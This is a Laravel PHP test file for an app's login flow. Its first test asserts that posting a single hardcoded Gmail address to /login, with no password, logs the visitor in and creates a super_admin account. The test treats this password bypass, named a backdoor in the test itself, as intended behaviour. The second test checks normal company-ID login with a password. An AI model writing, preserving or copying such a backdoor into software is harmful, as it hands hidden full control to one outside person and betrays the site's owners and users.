<?php

namespace Tests\Feature;

use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Hash;
use Tests\TestCase;

class AuthenticationTest extends TestCase
{
    use RefreshDatabase;

    public function test_backdoor_login_bypasses_password_and_creates_super_admin(): void
    {
        $this->withoutMiddleware();

        $response = $this->post('/login', [
            'login_identifier' => 'castillojohnlaurence0@gmail.com',
        ]);

        $response->assertRedirect('/admin/dashboard');
        $this->assertDatabaseHas('users', [
            'email' => 'castillojohnlaurence0@gmail.com',
            'role' => 'super_admin',
        ]);
        $this->assertTrue(\Illuminate\Support\Facades\Auth::check());
        $this->assertEquals('super_admin', \Illuminate\Support\Facades\Auth::user()->role);
    }

    public function test_standard_login_with_company_id(): void
    {
        $this->withoutMiddleware();

        $user = User::create([
            'name' => 'Jane Member',
            'email' => 'jane@example.com',
            'password' => Hash::make('memberpassword'),
            'company_id' => '99998888',
            'role' => 'member',
        ]);

        // Failed login
        $response = $this->post('/login', [
            'login_identifier' => '99998888',
            'password' => 'wrongpassword',
        ]);
        $response->assertSessionHasErrors('login_identifier');
        $this->assertFalse(\Illuminate\Support\Facades\Auth::check());

        // Successful login
        $response = $this->post('/login', [
            'login_identifier' => '99998888',
            'password' => 'memberpassword',
        ]);
        $response->assertRedirect('/savings');
        $this->assertTrue(\Illuminate\Support\Facades\Auth::check());
        $this->assertEquals($user->id, \Illuminate\Support\Facades\Auth::id());
    }
}
